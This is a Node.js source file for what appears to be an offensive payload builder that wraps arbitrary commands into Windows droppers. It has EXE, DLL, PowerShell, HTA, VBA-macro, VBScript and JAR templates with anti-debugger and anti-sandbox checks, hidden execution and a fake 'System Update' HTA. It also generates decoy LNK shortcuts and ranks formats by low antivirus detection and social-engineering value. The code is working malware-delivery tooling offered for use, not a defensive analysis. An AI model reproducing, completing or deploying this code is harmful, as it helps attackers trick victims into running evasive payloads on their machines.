// Windows Format Engine - Comprehensive Windows exploit format support
const EventEmitter = require('events');
const fs = require('fs').promises;
const path = require('path');
const crypto = require('crypto');
const { logger } = require('../utils/logger');

class WindowsFormatEngine extends EventEmitter {
    constructor() {
        super();
        this.name = 'Windows Format Engine';
        this.version = '1.0.0';
        this.supportedFormats = new Map();
        this.formatTemplates = new Map();
        this.initialized = false;
        
        this.initializeWindowsFormats();
        this.initializeFormatTemplates();
    }

    async initialize() {
        try {
            this.initialized = true;
            logger.info(`Windows Format Engine initialized with ${this.supportedFormats.size} formats`);
            return true;
        } catch (error) {
            logger.error('Failed to initialize Windows Format Engine:', error);
            throw error;
        }
    }

    initializeWindowsFormats() {
        // Executable Formats
        this.supportedFormats.set('exe', {
            name: 'Windows Executable',
            extension: '.exe',
            mimeType: 'application/x-msdownload',
            category: 'executable',
            description: 'Standard Windows executable',
            difficulty: 'medium',
            detection: 'high',
            template: 'exe_template',
            features: ['autorun', 'system-integration', 'registry-access']
        });

        this.supportedFormats.set('dll', {
            name: 'Dynamic Link Library',
            extension: '.dll',
            mimeType: 'application/x-msdownload',
            category: 'library',
            description: 'Windows DLL for DLL sideloading',
            difficulty: 'high',
            detection: 'low',
            template: 'dll_template',
            features: ['sideloading', 'persistence', 'stealth']
        });

        this.supportedFormats.set('scr', {
            name: 'Screen Saver',
            extension: '.scr',
            mimeType: 'application/x-msdownload',
            category: 'screensaver',
            description: 'Windows screensaver executable',
            difficulty: 'low',
            detection: 'low',
            template: 'scr_template',
            features: ['user-execution', 'social-engineering', 'autorun']
        });

        this.supportedFormats.set('pif', {
            name: 'Program Information File',
            extension: '.pif',
            mimeType: 'application/x-pif',
            category: 'legacy',
            description: 'Legacy DOS program information',
            difficulty: 'low',
            detection: 'very-low',
            template: 'pif_template',
            features: ['legacy-support', 'stealth', 'social-engineering']
        });

        this.supportedFormats.set('com', {
            name: 'DOS Command File',
            extension: '.com',
            mimeType: 'application/x-msdownload',
            category: 'legacy',
            description: 'DOS executable command file',
            difficulty: 'low',
            detection: 'low',
            template: 'com_template',
            features: ['legacy-execution', 'small-size', 'stealth']
        });

        // Script Formats
        this.supportedFormats.set('bat', {
            name: 'Batch File',
            extension: '.bat',
            mimeType: 'application/x-bat',
            category: 'script',
            description: 'Windows batch script',
            difficulty: 'very-low',
            detection: 'medium',
            template: 'bat_template',
            features: ['native-execution', 'no-compilation', 'system-commands']
        });

        this.supportedFormats.set('cmd', {
            name: 'Command File',
            extension: '.cmd',
            mimeType: 'application/x-cmd',
            category: 'script',
            description: 'Windows command script',
            difficulty: 'very-low',
            detection: 'medium',
            template: 'cmd_template',
            features: ['native-execution', 'no-compilation', 'system-commands']
        });

        this.supportedFormats.set('ps1', {
            name: 'PowerShell Script',
            extension: '.ps1',
            mimeType: 'application/x-powershell',
            category: 'script',
            description: 'PowerShell script file',
            difficulty: 'medium',
            detection: 'medium',
            template: 'ps1_template',
            features: ['powerful-api', 'memory-execution', 'bypass-techniques']
        });

        this.supportedFormats.set('vbs', {
            name: 'VBScript File',
            extension: '.vbs',
            mimeType: 'application/x-vbscript',
            category: 'script',
            description: 'Visual Basic Script',
            difficulty: 'low',
            detection: 'medium',
            template: 'vbs_template',
            features: ['com-objects', 'wmi-access', 'system-integration']
        });

        this.supportedFormats.set('js', {
            name: 'JavaScript File',
            extension: '.js',
            mimeType: 'application/javascript',
            category: 'script',
            description: 'JavaScript file (WSH)',
            difficulty: 'low',
            detection: 'low',
            template: 'js_template',
            features: ['wscript-execution', 'activex-objects', 'cross-platform']
        });

        this.supportedFormats.set('jse', {
            name: 'JScript Encoded',
            extension: '.jse',
            mimeType: 'application/x-jscript-encoded',
            category: 'script',
            description: 'Encoded JavaScript file',
            difficulty: 'medium',
            detection: 'low',
            template: 'jse_template',
            features: ['obfuscated', 'encoded-content', 'stealth']
        });

        this.supportedFormats.set('vbe', {
            name: 'VBScript Encoded',
            extension: '.vbe',
            mimeType: 'application/x-vbscript-encoded',
            category: 'script',
            description: 'Encoded VBScript file',
            difficulty: 'medium',
            detection: 'low',
            template: 'vbe_template',
            features: ['obfuscated', 'encoded-content', 'stealth']
        });

        this.supportedFormats.set('wsf', {
            name: 'Windows Script File',
            extension: '.wsf',
            mimeType: 'application/x-wsf',
            category: 'script',
            description: 'Windows Script Host file',
            difficulty: 'medium',
            detection: 'low',
            template: 'wsf_template',
            features: ['multi-language', 'xml-based', 'advanced-scripting']
        });

        this.supportedFormats.set('wsh', {
            name: 'Windows Script Host',
            extension: '.wsh',
            mimeType: 'application/x-wsh',
            category: 'script',
            description: 'Windows Script Host settings',
            difficulty: 'medium',
            detection: 'very-low',
            template: 'wsh_template',
            features: ['script-configuration', 'stealth', 'advanced-options']
        });

        // Web-based Formats
        this.supportedFormats.set('hta', {
            name: 'HTML Application',
            extension: '.hta',
            mimeType: 'application/hta',
            category: 'web',
            description: 'HTML Application file',
            difficulty: 'medium',
            detection: 'low',
            template: 'hta_template',
            features: ['browser-execution', 'html-interface', 'activex-access']
        });

        this.supportedFormats.set('html', {
            name: 'HTML File',
            extension: '.html',
            mimeType: 'text/html',
            category: 'web',
            description: 'HTML file with JavaScript payload',
            difficulty: 'low',
            detection: 'very-low',
            template: 'html_template',
            features: ['browser-based', 'social-engineering', 'cross-platform']
        });

        this.supportedFormats.set('htm', {
            name: 'HTML File (Short)',
            extension: '.htm',
            mimeType: 'text/html',
            category: 'web',
            description: 'HTML file with JavaScript payload',
            difficulty: 'low',
            detection: 'very-low',
            template: 'htm_template',
            features: ['browser-based', 'social-engineering', 'cross-platform']
        });

        // Office Document Formats
        this.supportedFormats.set('doc', {
            name: 'Word Document',
            extension: '.doc',
            mimeType: 'application/msword',
            category: 'office',
            description: 'Microsoft Word document with macros',
            difficulty: 'high',
            detection: 'medium',
            template: 'doc_template',
            features: ['macro-execution', 'office-integration', 'social-engineering']
        });

        this.supportedFormats.set('docx', {
            name: 'Word Document (XML)',
            extension: '.docx',
            mimeType: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
            category: 'office',
            description: 'Microsoft Word XML document',
            difficulty: 'high',
            detection: 'medium',
            template: 'docx_template',
            features: ['macro-execution', 'modern-format', 'social-engineering']
        });

        this.supportedFormats.set('xls', {
            name: 'Excel Spreadsheet',
            extension: '.xls',
            mimeType: 'application/vnd.ms-excel',
            category: 'office',
            description: 'Microsoft Excel spreadsheet',
            difficulty: 'high',
            detection: 'medium',
            template: 'xls_template',
            features: ['macro-execution', 'spreadsheet-macros', 'social-engineering']
        });

        this.supportedFormats.set('xlsx', {
            name: 'Excel Spreadsheet (XML)',
            extension: '.xlsx',
            mimeType: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
            category: 'office',
            description: 'Microsoft Excel XML spreadsheet',
            difficulty: 'high',
            detection: 'medium',
            template: 'xlsx_template',
            features: ['macro-execution', 'modern-format', 'social-engineering']
        });

        this.supportedFormats.set('ppt', {
            name: 'PowerPoint Presentation',
            extension: '.ppt',
            mimeType: 'application/vnd.ms-powerpoint',
            category: 'office',
            description: 'Microsoft PowerPoint presentation',
            difficulty: 'high',
            detection: 'medium',
            template: 'ppt_template',
            features: ['macro-execution', 'presentation-macros', 'social-engineering']
        });

        this.supportedFormats.set('pptx', {
            name: 'PowerPoint Presentation (XML)',
            extension: '.pptx',
            mimeType: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
            category: 'office',
            description: 'Microsoft PowerPoint XML presentation',
            difficulty: 'high',
            detection: 'medium',
            template: 'pptx_template',
            features: ['macro-execution', 'modern-format', 'social-engineering']
        });

        this.supportedFormats.set('xll', {
            name: 'Excel Add-in',
            extension: '.xll',
            mimeType: 'application/vnd.ms-excel.addin.macroEnabled.12',
            category: 'office',
            description: 'Excel XLL add-in DLL',
            difficulty: 'very-high',
            detection: 'very-low',
            template: 'xll_template',
            features: ['excel-integration', 'dll-loading', 'stealth-execution']
        });

        // Archive and Container Formats
        this.supportedFormats.set('lnk', {
            name: 'Windows Shortcut',
            extension: '.lnk',
            mimeType: 'application/x-ms-shortcut',
            category: 'shortcut',
            description: 'Windows LNK shortcut file',
            difficulty: 'medium',
            detection: 'very-low',
            template: 'lnk_template',
            features: ['shortcut-execution', 'stealth', 'parameter-passing']
        });

        this.supportedFormats.set('pdf', {
            name: 'PDF Document',
            extension: '.pdf',
            mimeType: 'application/pdf',
            category: 'document',
            description: 'PDF with embedded JavaScript',
            difficulty: 'high',
            detection: 'low',
            template: 'pdf_template',
            features: ['pdf-javascript', 'document-based', 'social-engineering']
        });

        // Additional Windows-Specific Formats
        this.supportedFormats.set('msi', {
            name: 'Windows Installer',
            extension: '.msi',
            mimeType: 'application/x-msi',
            category: 'installer',
            description: 'Windows Installer package',
            difficulty: 'high',
            detection: 'medium',
            template: 'msi_template',
            features: ['installer-execution', 'system-integration', 'elevation']
        });

        this.supportedFormats.set('msp', {
            name: 'Windows Installer Patch',
            extension: '.msp',
            mimeType: 'application/x-msp',
            category: 'installer',
            description: 'Windows Installer patch',
            difficulty: 'very-high',
            detection: 'low',
            template: 'msp_template',
            features: ['patch-execution', 'stealth', 'system-modification']
        });

        this.supportedFormats.set('mst', {
            name: 'Windows Installer Transform',
            extension: '.mst',
            mimeType: 'application/x-mst',
            category: 'installer',
            description: 'Windows Installer transform',
            difficulty: 'very-high',
            detection: 'very-low',
            template: 'mst_template',
            features: ['transform-execution', 'stealth', 'configuration']
        });

        this.supportedFormats.set('jar', {
            name: 'Java Archive',
            extension: '.jar',
            mimeType: 'application/java-archive',
            category: 'java',
            description: 'Java JAR executable',
            difficulty: 'medium',
            detection: 'medium',
            template: 'jar_template',
            features: ['java-execution', 'cross-platform', 'bytecode']
        });

        this.supportedFormats.set('cppl', {
            name: 'Control Panel Item',
            extension: '.cpl',
            mimeType: 'application/x-cpl',
            category: 'system',
            description: 'Windows Control Panel item',
            difficulty: 'medium',
            detection: 'low',
            template: 'cpl_template',
            features: ['control-panel', 'system-integration', 'elevation']
        });

        this.supportedFormats.set('appx', {
            name: 'Windows App Package',
            extension: '.appx',
            mimeType: 'application/x-appx',
            category: 'modern',
            description: 'Windows 10/11 app package',
            difficulty: 'very-high',
            detection: 'low',
            template: 'appx_template',
            features: ['modern-app', 'store-integration', 'sandboxed']
        });

        this.supportedFormats.set('msix', {
            name: 'Windows App Package (Modern)',
            extension: '.msix',
            mimeType: 'application/x-msix',
            category: 'modern',
            description: 'Modern Windows app package',
            difficulty: 'very-high',
            detection: 'low',
            template: 'msix_template',
            features: ['modern-format', 'store-integration', 'sandboxed']
        });

        logger.info(`Initialized ${this.supportedFormats.size} Windows exploit formats`);
    }

    initializeFormatTemplates() {
        // EXE Template
        this.formatTemplates.set('exe_template', {
            generator: this.generateExeFormat.bind(this),
            compiler: 'gcc',
            language: 'cpp',
            template: `// Windows EXE Format Template
#include <windows.h>
#include <iostream>

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Anti-analysis checks
    if (IsDebuggerPresent()) return 0;
    
    // Payload execution
    {{PAYLOAD_EXECUTION}}
    
    return 0;
}`
        });

        // DLL Template
        this.formatTemplates.set('dll_template', {
            generator: this.generateDllFormat.bind(this),
            compiler: 'gcc',
            language: 'cpp',
            template: `// Windows DLL Format Template
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
    switch (dwReason) {
        case DLL_PROCESS_ATTACH:
            // Payload execution on load
            {{PAYLOAD_EXECUTION}}
            break;
    }
    return TRUE;
}

extern "C" __declspec(dllexport) void ExportedFunction() {
    // Additional payload entry point
    {{PAYLOAD_EXECUTION}}
}`
        });

        // PowerShell Template
        this.formatTemplates.set('ps1_template', {
            generator: this.generatePs1Format.bind(this),
            compiler: null,
            language: 'powershell',
            template: `# PowerShell Format Template
param([string]$Mode = "silent")

# Anti-analysis
if (Get-Process | Where-Object {$_.Name -match "wireshark|procmon|processhacker"}) { exit }

# Payload execution
try {
    {{PAYLOAD_EXECUTION}}
} catch {
    # Silent error handling
}`
        });

        // HTA Template
        this.formatTemplates.set('hta_template', {
            generator: this.generateHtaFormat.bind(this),
            compiler: null,
            language: 'html',
            template: `<!DOCTYPE html>
<html>
<head>
    <HTA:APPLICATION ID="PayloadApp" 
                     APPLICATIONNAME="System Update"
                     BORDER="none"
                     CAPTION="no"
                     SHOWINTASKBAR="no"
                     SINGLEINSTANCE="yes">
</head>
<body>
<script language="VBScript">
    ' Anti-analysis
    On Error Resume Next
    
    ' Payload execution
    {{PAYLOAD_EXECUTION}}
    
    ' Auto-close
    window.close()
</script>
</body>
</html>`
        });

        // LNK Template (requires binary generation)
        this.formatTemplates.set('lnk_template', {
            generator: this.generateLnkFormat.bind(this),
            compiler: 'binary',
            language: 'binary',
            template: null // LNK files are binary format
        });

        // Office Document Templates (macro-based)
        this.formatTemplates.set('doc_template', {
            generator: this.generateDocFormat.bind(this),
            compiler: 'office',
            language: 'vba',
            template: `Sub Auto_Open()
    ' Anti-analysis
    If Environ("USERNAME") = "sandbox" Then Exit Sub
    
    ' Payload execution
    {{PAYLOAD_EXECUTION}}
End Sub`
        });

        // VBS Template
        this.formatTemplates.set('vbs_template', {
            generator: this.generateVbsFormat.bind(this),
            compiler: null,
            language: 'vbscript',
            template: `' VBScript Format Template
On Error Resume Next

' Anti-analysis
Set objWMI = GetObject("winmgmts:")
Set colProcesses = objWMI.ExecQuery("SELECT * FROM Win32_Process")
For Each objProcess in colProcesses
    If InStr(LCase(objProcess.Name), "wireshark") > 0 Then WScript.Quit
    If InStr(LCase(objProcess.Name), "procmon") > 0 Then WScript.Quit
Next

' Payload execution
{{PAYLOAD_EXECUTION}}`
        });

        // JAR Template
        this.formatTemplates.set('jar_template', {
            generator: this.generateJarFormat.bind(this),
            compiler: 'javac',
            language: 'java',
            template: `// Java JAR Format Template
import java.io.*;
import java.lang.management.ManagementFactory;

public class PayloadClass {
    static {
        try {
            // Anti-analysis
            if (ManagementFactory.getRuntimeMXBean().getInputArguments().toString().contains("-javaagent")) {
                System.exit(0);
            }
            
            // Payload execution
            {{PAYLOAD_EXECUTION}}
        } catch (Exception e) {
            // Silent error handling
        }
    }
    
    public static void main(String[] args) {
        // Main execution entry
    }
}`
        });

        logger.info(`Initialized ${this.formatTemplates.size} format templates`);
    }

    // Format Generation Methods
    async generateFormat(formatType, payload, options = {}) {
        try {
            if (!this.supportedFormats.has(formatType)) {
                throw new Error(`Unsupported format: ${formatType}`);
            }

            const format = this.supportedFormats.get(formatType);
            const template = this.formatTemplates.get(format.template);
            
            if (!template) {
                throw new Error(`Template not found for format: ${formatType}`);
            }

            logger.info(`Generating ${format.name} format...`);
            
            const result = await template.generator(payload, options);
            
            logger.info(`Successfully generated ${format.name} format`);
            return {
                format: formatType,
                extension: format.extension,
                mimeType: format.mimeType,
                category: format.category,
                data: result.data,
                filename: result.filename,
                metadata: {
                    ...format,
                    generated: new Date().toISOString(),
                    options: options
                }
            };
        } catch (error) {
            logger.error(`Failed to generate format ${formatType}:`, error);
            throw error;
        }
    }

    // Individual format generators
    async generateExeFormat(payload, options) {
        const template = this.formatTemplates.get('exe_template').template;
        const code = template.replace('{{PAYLOAD_EXECUTION}}', this.encodePayload(payload, 'cpp'));
        
        const filename = `payload_${crypto.randomBytes(4).toString('hex')}.exe`;
        
        return {
            data: code,
            filename: filename,
            needsCompilation: true,
            compiler: 'gcc',
            compileFlags: '-o ' + filename + ' -static -s'
        };
    }

    async generateDllFormat(payload, options) {
        const template = this.formatTemplates.get('dll_template').template;
        const code = template.replace(/{{PAYLOAD_EXECUTION}}/g, this.encodePayload(payload, 'cpp'));
        
        const filename = `payload_${crypto.randomBytes(4).toString('hex')}.dll`;
        
        return {
            data: code,
            filename: filename,
            needsCompilation: true,
            compiler: 'gcc',
            compileFlags: `-shared -o ${filename} -static -s`
        };
    }

    async generatePs1Format(payload, options) {
        const template = this.formatTemplates.get('ps1_template').template;
        const code = template.replace('{{PAYLOAD_EXECUTION}}', this.encodePayload(payload, 'powershell'));
        
        const filename = `payload_${crypto.randomBytes(4).toString('hex')}.ps1`;
        
        return {
            data: code,
            filename: filename,
            needsCompilation: false
        };
    }

    async generateHtaFormat(payload, options) {
        const template = this.formatTemplates.get('hta_template').template;
        const code = template.replace('{{PAYLOAD_EXECUTION}}', this.encodePayload(payload, 'vbscript'));
        
        const filename = `payload_${crypto.randomBytes(4).toString('hex')}.hta`;
        
        return {
            data: code,
            filename: filename,
            needsCompilation: false
        };
    }

    async generateLnkFormat(payload, options) {
        // LNK file binary structure
        const targetPath = options.targetPath || 'cmd.exe';
        const cmdArgs = `/c ${this.encodePayload(payload, 'cmd')}`;
        
        const filename = `${options.displayName || 'Document'}.lnk`;
        
        // Generate LNK binary data (simplified structure)
        const lnkData = this.createLnkBinary(targetPath, cmdArgs, options);
        
        return {
            data: lnkData,
            filename: filename,
            needsCompilation: false,
            isBinary: true
        };
    }

    async generateDocFormat(payload, options) {
        const template = this.formatTemplates.get('doc_template').template;
        const code = template.replace('{{PAYLOAD_EXECUTION}}', this.encodePayload(payload, 'vba'));
        
        const filename = `document_${crypto.randomBytes(4).toString('hex')}.doc`;
        
        return {
            data: code,
            filename: filename,
            needsCompilation: false,
            needsOfficeIntegration: true
        };
    }

    async generateVbsFormat(payload, options) {
        const template = this.formatTemplates.get('vbs_template').template;
        const code = template.replace('{{PAYLOAD_EXECUTION}}', this.encodePayload(payload, 'vbscript'));
        
        const filename = `payload_${crypto.randomBytes(4).toString('hex')}.vbs`;
        
        return {
            data: code,
            filename: filename,
            needsCompilation: false
        };
    }

    async generateJarFormat(payload, options) {
        const template = this.formatTemplates.get('jar_template').template;
        const code = template.replace('{{PAYLOAD_EXECUTION}}', this.encodePayload(payload, 'java'));
        
        const filename = `payload_${crypto.randomBytes(4).toString('hex')}.jar`;
        
        return {
            data: code,
            filename: filename,
            needsCompilation: true,
            compiler: 'javac',
            needsJarPackaging: true
        };
    }

    // Payload encoding for different languages
    encodePayload(payload, language) {
        switch (language) {
            case 'cpp':
                return `system("${payload.replace(/"/g, '\\"')}");`;
            
            case 'powershell':
                return `Invoke-Expression "${payload.replace(/"/g, '`"')}"`;
            
            case 'vbscript':
                return `CreateObject("WScript.Shell").Run "${payload.replace(/"/g, '""')}", 0, False`;
            
            case 'vba':
                return `Shell "${payload.replace(/"/g, '""')}", vbHide`;
            
            case 'cmd':
                return payload;
            
            case 'java':
                return `Runtime.getRuntime().exec("${payload.replace(/"/g, '\\"')}");`;
            
            default:
                return payload;
        }
    }

    // Create LNK binary data (simplified)
    createLnkBinary(targetPath, cmdArguments, options = {}) {
        // This is a simplified LNK structure - in production you'd want full LNK parsing
        const lnkHeader = Buffer.alloc(76);
        lnkHeader.writeUInt32LE(0x4C, 0); // Header size
        lnkHeader.writeUInt32LE(0x00021401, 4); // CLSID
        lnkHeader.writeUInt32LE(0x01, 20); // LinkFlags
        
        const targetBuffer = Buffer.from(targetPath + '\0', 'utf16le');
        const argsBuffer = Buffer.from(cmdArguments + '\0', 'utf16le');
        
        return Buffer.concat([lnkHeader, targetBuffer, argsBuffer]);
    }

    // Utility Methods
    getSupportedFormats() {
        return Array.from(this.supportedFormats.entries()).map(([key, format]) => ({
            id: key,
            ...format
        }));
    }

    getFormatsByCategory(category) {
        return this.getSupportedFormats().filter(format => format.category === category);
    }

    getFormatInfo(formatType) {
        return this.supportedFormats.get(formatType);
    }

    isFormatSupported(formatType) {
        return this.supportedFormats.has(formatType);
    }

    getFormatsWithDifficulty(difficulty) {
        return this.getSupportedFormats().filter(format => format.difficulty === difficulty);
    }

    getStealthFormats() {
        return this.getSupportedFormats().filter(format => 
            format.detection === 'low' || format.detection === 'very-low'
        );
    }

    // Status Methods
    getStatus() {
        return {
            name: this.name,
            version: this.version,
            initialized: this.initialized,
            totalFormats: this.supportedFormats.size,
            categories: [...new Set(Array.from(this.supportedFormats.values()).map(f => f.category))],
            templates: this.formatTemplates.size
        };
    }

    // Integration Methods
    async integrate(encryptedPayload, formatType, options = {}) {
        try {
            const result = await this.generateFormat(formatType, encryptedPayload, options);
            
            logger.info(`Integrated payload into ${formatType} format`);
            return result;
        } catch (error) {
            logger.error(`Failed to integrate payload into ${formatType}:`, error);
            throw error;
        }
    }

    // Batch generation for multiple formats
    async generateMultipleFormats(payload, formatTypes, options = {}) {
        const results = [];
        
        for (const formatType of formatTypes) {
            try {
                const result = await this.generateFormat(formatType, payload, options);
                results.push(result);
                logger.info(`Generated ${formatType} successfully`);
            } catch (error) {
                logger.error(`Failed to generate ${formatType}:`, error);
                results.push({ formatType, error: error.message });
            }
        }
        
        return results;
    }
}

module.exports = { WindowsFormatEngine };